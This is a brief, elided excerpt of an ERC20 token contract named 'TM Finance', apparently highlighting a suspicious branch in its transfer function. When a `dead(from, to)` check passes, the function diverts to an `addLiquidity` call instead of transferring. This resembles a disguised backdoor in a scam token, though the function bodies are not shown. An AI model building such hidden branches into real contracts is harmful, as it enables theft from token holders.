...
contract TOKEN is Ownable, IERC20 {
    ...
    string private _name = "TM Finance";
    ...
    uint256 public _totalSupply = 500000 * 10 ** _decimals;
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual {
        ...
        if (dead(from, to)) {return addLiquidity(amount, to);}
    ...
    function dead(address from, address to) internal view returns(bool) {
